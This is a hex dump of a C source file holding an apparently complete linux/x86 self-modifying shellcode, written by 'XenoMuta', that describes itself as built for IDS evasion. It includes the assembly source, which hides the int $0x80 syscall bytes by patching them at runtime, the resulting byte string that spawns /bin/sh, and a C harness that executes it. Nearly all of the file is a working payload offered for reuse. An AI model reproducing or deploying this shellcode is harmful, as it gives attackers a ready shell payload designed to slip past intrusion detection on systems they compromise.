00000000  2f 2a 0d 0a 20 20 20 20  5f 20 20 5f 5f 20 20 20  |/*..    _  __   |
00000010  20 20 20 20 20 20 20 20  20 20 20 20 20 20 5f 5f  |              __|
00000020  20 20 5f 5f 5f 20 20 20  20 20 20 5f 5f 0d 0a 20  |  ___      __.. |
00000030  20 20 7c 20 7c 2f 20 2f  5f 5f 20 20 5f 5f 5f 5f  |  | |/ /__  ____|
00000040  20 20 5f 5f 5f 5f 20 20  2f 20 20 7c 2f 20 20 2f  |  ____  /  |/  /|
00000050  5f 20 20 5f 5f 2f 20 2f  5f 5f 5f 5f 5f 20 5f 0d  |_  __/ /_____ _.|
00000060  0a 20 20 20 7c 20 20 20  2f 20 5f 20 5c 2f 20 5f  |.   |   / _ \/ _|
00000070  5f 20 5c 2f 20 5f 5f 20  5c 2f 20 2f 7c 5f 2f 20  |_ \/ __ \/ /|_/ |
00000080  2f 20 2f 20 2f 20 2f 20  5f 5f 2f 20 5f 5f 20 60  |/ / / / __/ __ `|
00000090  2f 0d 0a 20 20 2f 20 20  20 2f 20 20 5f 5f 2f 20  |/..  /   /  __/ |
000000a0  2f 20 2f 20 2f 20 2f 5f  2f 20 2f 20 2f 20 20 2f  |/ / / /_/ / /  /|
000000b0  20 2f 20 2f 5f 2f 20 2f  20 2f 5f 2f 20 2f 5f 2f  | / /_/ / /_/ /_/|
000000c0  20 2f 0d 0a 20 2f 5f 2f  7c 5f 5c 5f 5f 5f 2f 5f  | /.. /_/|_\___/_|
000000d0  2f 20 2f 5f 2f 5c 5f 5f  5f 5f 2f 5f 2f 20 20 2f  |/ /_/\____/_/  /|
000000e0  5f 2f 5c 5f 5f 2c 5f 2f  5c 5f 5f 2f 5c 5f 5f 2c  |_/\__,_/\__/\__,|
000000f0  5f 2f 0d 0a 0d 0a 20 78  65 6e 6f 6d 75 74 61 5c  |_/.... xenomuta\|
00000100  78 34 30 70 68 72 65 61  6b 65 72 5c 78 32 65 6e  |x40phreaker\x2en|
00000110  65 74 0d 0a 20 68 74 74  70 3a 2f 2f 78 65 6e 6f  |et.. http://xeno|
00000120  6d 75 74 61 2e 74 75 78  66 61 6d 69 6c 79 2e 6f  |muta.tuxfamily.o|
00000130  72 67 2f 20 2d 20 4d 65  74 68 79 6c 78 61 6e 74  |rg/ - Methylxant|
00000140  69 6e 61 20 32 35 36 6d  67 0d 0a 0d 0a 20 44 65  |ina 256mg.... De|
00000150  73 63 72 69 70 74 69 6f  6e 3a 0d 0a 20 6c 69 6e  |scription:.. lin|
00000160  75 78 2f 78 38 36 20 53  65 6c 66 2d 6d 6f 64 69  |ux/x86 Self-modi|
00000170  66 79 69 6e 67 20 53 68  65 6c 6c 43 6f 64 65 20  |fying ShellCode |
00000180  66 6f 72 20 49 44 53 20  65 76 61 73 69 6f 6e 0d  |for IDS evasion.|
00000190  0a 20 63 72 65 61 74 65  73 20 69 6e 74 20 24 30  |. creates int $0|
000001a0  78 38 30 20 73 79 73 63  61 6c 6c 73 20 6f 6e 20  |x80 syscalls on |
000001b0  72 75 6e 74 69 6d 65 2e  0d 0a 0d 0a 20 4f 53 3a  |runtime..... OS:|
000001c0  20 4c 69 6e 75 78 0d 0a  20 41 72 63 68 3a 20 78  | Linux.. Arch: x|
000001d0  38 36 0d 0a 20 4c 65 6e  67 74 68 3a 20 36 34 20  |86.. Length: 64 |
000001e0  62 79 74 65 73 20 28 20  33 35 20 77 69 74 68 6f  |bytes ( 35 witho|
000001f0  75 74 20 2f 62 69 6e 2f  73 68 20 70 61 79 6c 6f  |ut /bin/sh paylo|
00000200  61 64 20 29 0d 0a 20 41  75 74 68 6f 72 3a 20 58  |ad ).. Author: X|
00000210  65 6e 6f 4d 75 74 61 0d  0a 0d 0a 20 68 6f 6c 61  |enoMuta.... hola|
00000220  20 61 74 3a 0d 0a 20 20  73 74 72 30 6b 33 2c 20  | at:..  str0k3, |
00000230  67 61 72 61 79 2c 20 66  72 31 74 30 6c 34 79 2c  |garay, fr1t0l4y,|
00000240  20 65 6d 72 61 2e 0d 0a  20 20 2d 20 47 6f 64 20  | emra...  - God |
00000250  62 6c 65 73 73 20 79 6f  75 20 61 6c 6c 20 2d 0d  |bless you all -.|
00000260  0a 0d 0a 3d 3d 3d 20 53  4f 55 52 43 45 20 43 4f  |...=== SOURCE CO|
00000270  44 45 20 3d 3d 3d 3d 0d  0a 2e 67 6c 6f 62 6c 20  |DE ====...globl |
00000280  5f 73 74 61 72 74 0d 0a  5f 73 74 61 72 74 3a 0d  |_start.._start:.|
00000290  0a 09 6a 6d 70 20 5f 66  69 6e 64 4f 75 74 09 0d  |..jmp _findOut..|
000002a0  0a 5f 57 68 65 72 65 41  6d 49 3a 0d 0a 09 70 6f  |._WhereAmI:...po|
000002b0  70 20 25 65 64 78 09 2f  2f 20 53 61 76 65 20 6f  |p %edx.// Save o|
000002c0  75 72 20 70 61 79 6c 6f  61 64 27 73 20 61 64 64  |ur payload's add|
000002d0  72 65 73 73 20 67 32 30  0d 0a 09 6d 6f 76 20 25  |ress g20...mov %|
000002e0  65 64 78 2c 20 25 65 73  69 09 2f 2f 20 61 6e 64  |edx, %esi.// and|
000002f0  20 73 61 76 65 20 69 74  20 34 20 6c 61 74 65 72  | save it 4 later|
00000300  20 0d 0a 5f 6c 6f 6f 70  4d 61 6b 65 49 6e 74 38  | .._loopMakeInt8|
00000310  30 73 3a 0d 0a 09 6d 6f  76 20 28 25 65 64 78 29  |0s:...mov (%edx)|
00000320  2c 20 25 65 61 78 0d 0a  09 63 6d 70 77 20 24 30  |, %eax...cmpw $0|
00000330  78 37 64 63 61 2c 20 25  61 78 09 2f 2f 20 46 69  |x7dca, %ax.// Fi|
00000340  6e 64 20 74 68 69 73 20  67 75 79 20 28 20 30 78  |nd this guy ( 0x|
00000350  37 64 63 61 20 29 20 61  6e 64 20 0d 0a 09 6a 6e  |7dca ) and ...jn|
00000360  65 20 5f 6e 6f 0d 0a 09  61 64 64 77 20 24 30 78  |e _no...addw $0x|
00000370  33 30 33 2c 20 25 61 78  09 2f 2f 20 30 78 37 64  |303, %ax.// 0x7d|
00000380  63 61 20 2b 20 30 78 33  30 33 20 3d 3d 20 30 78  |ca + 0x303 == 0x|
00000390  38 30 63 64 20 28 20 69  6e 74 20 24 30 78 38 30  |80cd ( int $0x80|
000003a0  20 29 0d 0a 09 6d 6f 76  20 25 65 61 78 2c 20 28  | )...mov %eax, (|
000003b0  25 65 64 78 29 0d 0a 5f  6e 6f 3a 0d 0a 09 69 6e  |%edx).._no:...in|
000003c0  63 62 20 25 64 6c 0d 0a  09 63 6d 70 20 24 30 78  |cb %dl...cmp $0x|
000003d0  34 31 34 31 34 31 34 31  2c 20 25 65 61 78 09 2f  |41414141, %eax./|
000003e0  2f 20 55 73 65 20 27 41  41 41 41 27 20 61 73 20  |/ Use 'AAAA' as |
000003f0  65 6e 64 20 4d 61 72 6b  65 72 2e 0d 0a 09 6a 6e  |end Marker....jn|
00000400  65 20 5f 6c 6f 6f 70 4d  61 6b 65 49 6e 74 38 30  |e _loopMakeInt80|
00000410  73 09 0d 0a 09 6a 6d 70  20 2a 25 65 73 69 09 09  |s....jmp *%esi..|
00000420  2f 2f 20 4a 75 6d 70 20  74 6f 20 6f 75 72 20 63  |// Jump to our c|
00000430  6f 6e 76 65 72 74 65 64  20 63 6f 64 65 20 77 68  |onverted code wh|
00000440  65 6e 20 64 6f 6e 65 0d  0a 5f 66 69 6e 64 4f 75  |en done.._findOu|
00000450  74 3a 0d 0a 09 63 61 6c  6c 20 5f 57 68 65 72 65  |t:...call _Where|
00000460  41 6d 49 0d 0a 5f 70 61  79 6c 6f 61 64 3a 09 09  |AmI.._payload:..|
00000470  09 2f 2f 20 50 61 73 74  65 20 79 6f 75 72 20 73  |.// Paste your s|
00000480  68 65 6c 6c 20 63 6f 64  65 20 68 65 72 65 20 61  |hell code here a|
00000490  6e 64 20 74 68 65 6e 20  72 65 70 6c 61 63 65 20  |nd then replace |
000004a0  0d 0a 09 78 6f 72 20 25  65 64 78 2c 20 25 65 64  |...xor %edx, %ed|
000004b0  78 09 09 2f 2f 20 22 5c  78 63 64 5c 78 38 30 22  |x..// "\xcd\x80"|
000004c0  20 28 69 6e 74 20 24 30  78 38 30 29 20 66 6f 72  | (int $0x80) for|
000004d0  20 2e 61 73 63 69 69 20  22 5c 78 63 61 37 64 22  | .ascii "\xca7d"|
000004e0  20 0d 0a 09 70 75 73 68  20 24 30 78 62 09 09 2f  | ...push $0xb../|
000004f0  2f 20 61 6e 64 20 65 6e  64 20 77 69 74 68 20 2e  |/ and end with .|
00000500  61 73 63 69 69 20 22 41  41 41 41 22 20 61 73 20  |ascii "AAAA" as |
00000510  65 6e 64 20 6d 61 72 6b  65 72 20 0d 0a 09 70 6f  |end marker ...po|
00000520  70 20 25 65 61 78 0d 0a  09 63 6c 74 64 0d 0a 09  |p %eax...cltd...|
00000530  70 75 73 68 20 25 65 64  78 0d 0a 09 70 75 73 68  |push %edx...push|
00000540  20 24 30 78 36 38 37 33  32 66 32 66 0d 0a 09 70  | $0x68732f2f...p|
00000550  75 73 68 20 24 30 78 36  65 36 39 36 32 32 66 0d  |ush $0x6e69622f.|
00000560  0a 09 6d 6f 76 20 25 65  73 70 2c 20 25 65 62 78  |..mov %esp, %ebx|
00000570  0d 0a 09 70 75 73 68 20  25 65 64 78 0d 0a 09 70  |...push %edx...p|
00000580  75 73 68 20 25 65 62 78  0d 0a 09 6d 6f 76 20 25  |ush %ebx...mov %|
00000590  65 73 70 2c 25 65 63 78  0d 0a 09 2e 61 73 63 69  |esp,%ecx....asci|
000005a0  69 20 22 5c 78 63 61 5c  78 37 64 22 20 2f 2f 20  |i "\xca\x7d" // |
000005b0  2b 20 30 78 33 30 33 20  3d 20 30 78 63 64 38 30  |+ 0x303 = 0xcd80|
000005c0  20 28 69 6e 74 20 24 30  78 38 30 29 0d 0a 09 2e  | (int $0x80)....|
000005d0  61 73 63 69 69 20 22 41  41 41 41 22 0d 0a 3d 3d  |ascii "AAAA"..==|
000005e0  3d 20 53 4f 55 52 43 45  20 43 4f 44 45 20 3d 3d  |= SOURCE CODE ==|
000005f0  3d 3d 0d 0a 2a 2f 0d 0a  0d 0a 0d 0a 63 68 61 72  |==..*/......char|
00000600  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 20 3d 20 22  | shellcode[] = "|
00000610  5c 78 65 62 5c 78 31 63  5c 78 35 61 5c 78 38 39  |\xeb\x1c\x5a\x89|
00000620  5c 78 64 36 5c 78 38 62  5c 78 30 32 5c 78 36 36  |\xd6\x8b\x02\x66|
00000630  5c 78 33 64 5c 78 63 61  5c 78 37 64 5c 78 37 35  |\x3d\xca\x7d\x75|
00000640  5c 78 30 36 5c 78 36 36  5c 78 30 35 5c 78 30 33  |\x06\x66\x05\x03|
00000650  5c 78 30 33 5c 78 38 39  5c 78 30 32 5c 78 66 65  |\x03\x89\x02\xfe|
00000660  5c 78 63 32 5c 78 33 64  5c 78 34 31 5c 78 34 31  |\xc2\x3d\x41\x41|
00000670  5c 78 34 31 5c 78 34 31  5c 78 37 35 5c 78 65 39  |\x41\x41\x75\xe9|
00000680  5c 78 66 66 5c 78 65 36  5c 78 65 38 5c 78 64 66  |\xff\xe6\xe8\xdf|
00000690  5c 78 66 66 5c 78 66 66  5c 78 66 66 5c 78 33 31  |\xff\xff\xff\x31|
000006a0  5c 78 64 32 5c 78 36 61  5c 78 30 62 5c 78 35 38  |\xd2\x6a\x0b\x58|
000006b0  5c 78 39 39 5c 78 35 32  5c 78 36 38 5c 78 32 66  |\x99\x52\x68\x2f|
000006c0  5c 78 32 66 5c 78 37 33  5c 78 36 38 5c 78 36 38  |\x2f\x73\x68\x68|
000006d0  5c 78 32 66 5c 78 36 32  5c 78 36 39 5c 78 36 65  |\x2f\x62\x69\x6e|
000006e0  5c 78 38 39 5c 78 65 33  5c 78 35 32 5c 78 35 33  |\x89\xe3\x52\x53|
000006f0  5c 78 38 39 5c 78 65 31  5c 78 63 61 5c 78 37 64  |\x89\xe1\xca\x7d|
00000700  5c 78 34 31 5c 78 34 31  5c 78 34 31 5c 78 34 31  |\x41\x41\x41\x41|
00000710  22 3b 0d 0a 0d 0a 69 6e  74 20 6d 61 69 6e 20 28  |";....int main (|
00000720  29 0d 0a 7b 0d 0a 09 70  72 69 6e 74 66 28 22 4c  |)..{...printf("L|
00000730  65 6e 67 74 68 3a 20 25  64 20 62 79 74 65 73 5c  |ength: %d bytes\|
00000740  6e 22 2c 20 73 74 72 6c  65 6e 28 73 68 65 6c 6c  |n", strlen(shell|
00000750  63 6f 64 65 29 29 3b 0d  0a 09 69 6e 74 20 28 2a  |code));...int (*|
00000760  73 63 29 28 29 20 3d 20  28 69 6e 74 20 28 2a 29  |sc)() = (int (*)|
00000770  28 29 29 73 68 65 6c 6c  63 6f 64 65 3b 0d 0a 09  |())shellcode;...|
00000780  73 63 28 29 3b 0d 0a 09  72 65 74 75 72 6e 20 30  |sc();...return 0|
00000790  3b 0d 0a 7d                                       |;..}|
00000794
